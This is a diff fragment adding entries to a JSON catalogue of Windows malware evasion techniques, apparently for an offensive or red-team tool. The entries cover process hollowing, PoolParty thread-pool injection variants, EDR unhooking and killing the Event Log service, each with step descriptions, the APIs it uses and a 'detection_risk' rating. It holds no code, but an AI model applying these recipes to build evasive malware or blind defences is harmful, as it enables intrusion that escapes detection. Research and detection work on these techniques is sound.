+      "created_at": "2026-03-06T12:53:26.083170",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Drip Loader",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Evade event-based injection detection by delaying memory permission changes and splitting shellcode injection across multiple operations. Separates RW and RX permission phases to bypass event tracing detection",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "VirtualProtect",
+        "VirtualAlloc"
+      ],
+      "id": "T110",
+      "created_at": "2026-03-06T12:53:30.604499",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Process Hollowing",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Create suspended process, unmap its memory (NtUnmapViewOfSection), allocate memory at same base address, write shellcode/DLL, set thread context to entry point, and resume. More specific than generic process injection.",
+      "complexity": "complex",
+      "detection_risk": "medium",
+      "apis": [
+        "CreateProcess",
+        "NtUnmapViewOfSection",
+        "VirtualAllocEx",
+        "WriteProcessMemory",
+        "SetThreadContext",
+        "ResumeThread"
+      ],
+      "id": "T111",
+      "created_at": "2026-03-06T12:53:53.177393",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "sRDI Shellcode Conversion",
+      "type": "string_obfuscation",
+      "evasion_type": "string_obfuscation",
+      "description": "Convert DLL to position-independent shellcode using sRDI (Shellcode Reflective DLL Injection). The converted shellcode can be injected like regular shellcode without needing a PE loader",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "VirtualAlloc",
+        "memcpy"
+      ],
+      "id": "T112",
+      "created_at": "2026-03-06T12:53:53.737011",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "NtQueueApcThreadEx Local Execution",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Queue APC to current process thread using NtQueueApcThreadEx native API for local shellcode execution. Similar to QueueUserAPC but uses direct syscall",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "NtQueueApcThreadEx",
+        "NtAlertResumeThread"
+      ],
+      "id": "T113",
+      "created_at": "2026-03-06T12:53:58.427788",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "NINA - No Injection No Allocation",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Process injection technique that executes shellcode in remote processes without using VirtualAllocEx or CreateRemoteThread. Uses SetThreadContext to manipulate thread execution, finds existing RW memory pages in target process for stack data, finds existing RX pages for shellcode placement in the executable image itself (avoiding PE-sieve detection), and uses ReadProcessMemory/WriteProcessMemory via the target process itself to transfer data. Requires process handle duplication to allow target to read attacker process memory.",
+      "complexity": "complex",
+      "detection_risk": "low",
+      "apis": [
+        "SetThreadContext",
+        "GetThreadContext",
+        "SuspendThread",
+        "ResumeThread",
+        "NtQueryInformationThread",
+        "NtQueryInformationProcess",
+        "ReadProcessMemory",
+        "WriteProcessMemory",
+        "VirtualQueryEx",
+        "DuplicateHandle"
+      ],
+      "id": "T114",
+      "created_at": "2026-03-06T14:16:49.772475",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Handle Hijacking for Thread Pool Objects",
+      "type": "privilege_escalation",
+      "evasion_type": "privilege_escalation",
+      "description": "Technique to hijack handles to thread pool objects (TpWorkerFactory, IoCompletion, IRTimer) from a target process. Uses NtQueryInformationProcess with ProcessHandleInformation to enumerate all handles in the target process, then NtQueryObject to identify the object type, and DuplicateHandle to steal handles with desired access rights. Enables subsequent PoolParty injection variants.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "NtQueryInformationProcess",
+        "NtQueryObject",
+        "DuplicateHandle"
+      ],
+      "id": "T115",
+      "created_at": "2026-03-06T14:18:12.863128",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Worker Factory Start Routine Overwrite",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that overwrites the StartRoutine of a worker factory to execute shellcode. Hijacks the TpWorkerFactory handle from the target process, queries its WORKER_FACTORY_BASIC_INFORMATION to get the StartRoutine address, and uses NtSetInformationWorkerFactory to trigger execution by increasing the minimum thread count. No VirtualAllocEx needed - reuses existing code pages.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "NtQueryInformationWorkerFactory",
+        "NtSetInformationWorkerFactory",
+        "OpenProcess",
+        "WriteProcessMemory"
+      ],
+      "id": "T116",
+      "created_at": "2026-03-06T14:18:13.216455",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP Work Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that creates a malicious TP_WORK structure in the local process, modifies it to point to the target process TP_POOL, and writes it to the target process. The work item is inserted into the high-priority task queue of the target process thread pool, causing the shellcode callback to execute when the thread pool processes the work item.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateThreadpoolWork",
+        "VirtualAllocEx",
+        "WriteProcessMemory",
+        "NtQueryInformationWorkerFactory"
+      ],
+      "id": "T117",
+      "created_at": "2026-03-06T14:18:23.127750",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP Timer Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that crafts a malicious TP_TIMER structure pointing to shellcode and inserts it into the target process timer queue. Hijacks both TpWorkerFactory and IRTimer handles, allocates the timer structure in target process, and uses NtSetTimer2 to trigger TppTimerQueueExpiration which executes the callback.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateThreadpoolTimer",
+        "NtSetTimer2",
+        "VirtualAllocEx",
+        "WriteProcessMemory",
+        "NtQueryInformationWorkerFactory"
+      ],
+      "id": "T118",
+      "created_at": "2026-03-06T14:18:23.448065",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP Wait Insertion via IO Completion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that creates a TP_WAIT structure, allocates it in target process, and associates it with the hijacked IO completion port via ZwAssociateWaitCompletionPacket. Sets an event to queue a packet to the IO completion port, triggering the wait callback in the target process.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateThreadpoolWait",
+        "ZwAssociateWaitCompletionPacket",
+        "SetEvent",
+        "VirtualAllocEx",
+        "WriteProcessMemory"
+      ],
+      "id": "T119",
+      "created_at": "2026-03-06T14:18:31.561410",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP IO Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that creates a TP_IO structure associated with a file handle and the target process IO completion port. Performs asynchronous file write which queues a completion packet to the IOCP, causing the shellcode callback to execute in the target process context.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "CreateThreadpoolIo",
+        "CreateFile",
+        "ZwSetInformationFile",
+        "WriteFile",
+        "VirtualAllocEx",
+        "WriteProcessMemory"
+      ],
+      "id": "T120",
+      "created_at": "2026-03-06T14:18:31.863679",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP ALPC Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that uses ALPC (Advanced Local Procedure Call) port to trigger shellcode execution. Creates TP_ALPC structure, associates it with an ALPC port connected to the target process IO completion port, and sends a message to trigger the callback.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "TpAllocAlpcCompletion",
+        "NtAlpcCreatePort",
+        "NtAlpcConnectPort",
+        "NtAlpcSetInformation",
+        "VirtualAllocEx",
+        "WriteProcessMemory"
+      ],
+      "id": "T121",
+      "created_at": "2026-03-06T14:18:41.968061",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP Job Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that uses job objects to trigger shellcode. Creates TP_JOB structure with shellcode callback, associates the job object with the target process IO completion port, and assigns the current process to the job to trigger the notification callback in target process.",
+      "complexity": "complex",
+      "detection_risk": "very_low",
+      "apis": [
+        "TpAllocJobNotification",
+        "CreateJobObject",
+        "SetInformationJobObject",
+        "AssignProcessToJobObject",
+        "VirtualAllocEx",
+        "WriteProcessMemory"
+      ],
+      "id": "T122",
+      "created_at": "2026-03-06T14:18:42.274074",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Remote TP Direct Insertion",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "PoolParty variant that directly queues a packet to the hijacked IO completion port. Creates a TP_DIRECT structure with the shellcode callback address and uses ZwSetIoCompletion to queue it directly to the target process worker factory IO completion port.",
+      "complexity": "medium",
+      "detection_risk": "very_low",
+      "apis": [
+        "ZwSetIoCompletion",
+        "VirtualAllocEx",
+        "WriteProcessMemory"
+      ],
+      "id": "T123",
+      "created_at": "2026-03-06T14:19:08.628565",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "EtwpCreateEtwThread Execution",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Shellcode execution using the undocumented EtwpCreateEtwThread function from ntdll. Allocates RW memory, copies shellcode, changes protection to RX, and creates a new thread through the ETW (Event Tracing for Windows) subsystem. Avoids the standard CreateThread/CreateRemoteThread APIs.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "EtwpCreateEtwThread",
+        "NtAllocateVirtualMemory",
+        "NtProtectVirtualMemory",
+        "RtlCopyMemory"
+      ],
+      "id": "T124",
+      "created_at": "2026-03-06T14:20:36.349440",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "NtQueueApcThreadEx Special User APC",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Shellcode execution using NtQueueApcThreadEx with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC flag. This allows APC injection without alertable thread state requirement. Creates a special user-mode APC that executes immediately on the current thread.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "NtQueueApcThreadEx",
+        "NtAllocateVirtualMemory",
+        "NtProtectVirtualMemory"
+      ],
+      "id": "T125",
+      "created_at": "2026-03-06T14:20:36.651952",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Peruns Unhooking",
+      "type": "unhooking",
+      "evasion_type": "unhooking",
+      "description": "Unhooking technique that spawns a suspended clean process (e.g., notepad.exe), reads the unhooked ntdll.dll .text section from it, and overwrites the hooked ntdll in the current process. Bypasses EDR hooks by using a clean copy from a fresh process.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "CreateProcessW",
+        "ReadProcessMemory",
+        "WriteProcessMemory",
+        "NtProtectVirtualMemory",
+        "TerminateProcess"
+      ],
+      "id": "T126",
+      "created_at": "2026-03-06T14:20:49.685213",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Phant0m Event Log Termination",
+      "type": "defense_evasion",
+      "evasion_type": "defense_evasion",
+      "description": "Technique to disable Windows Event Log service by terminating all threads belonging to EventLog service process. Enumerates all threads, identifies those belonging to EventLog via service tag query (I_QueryTagInformation), and terminates them. Effectively stops event logging.",
+      "complexity": "medium",
+      "detection_risk": "medium",
+      "apis": [
+        "CreateToolhelp32Snapshot",
+        "Thread32First",
+        "Thread32Next",
+        "NtQueryInformationThread",
+        "I_QueryTagInformation",
+        "OpenThread",
+        "OpenProcess",
+        "TerminateThread"
+      ],
+      "id": "T127",
+      "created_at": "2026-03-06T14:20:50.005331",
+      "category": "evasion",
+      "source": "manual"
+    },
+    {
+      "name": "Entry Point Overwrite No RWX",
+      "type": "execution_evasion",
+      "evasion_type": "execution_evasion",
+      "description": "Process hollowing variant that avoids RWX memory. Creates a suspended process, reads the entry point from the PE header, overwrites the entry point with shellcode, and resumes the thread. No VirtualAllocEx or RWX pages needed.",
+      "complexity": "medium",
+      "detection_risk": "low",
+      "apis": [
+        "CreateProcessW",
+        "NtQueryInformationProcess",
+        "ReadProcessMemory",
+        "WriteProcessMemory",
+        "ResumeThread"
+      ],
+      "id": "T128",
+      "created_at": "2026-03-06T14:20:53.199021",
+      "category": "evasion",
+      "source": "manual"
     }
   ]
 }
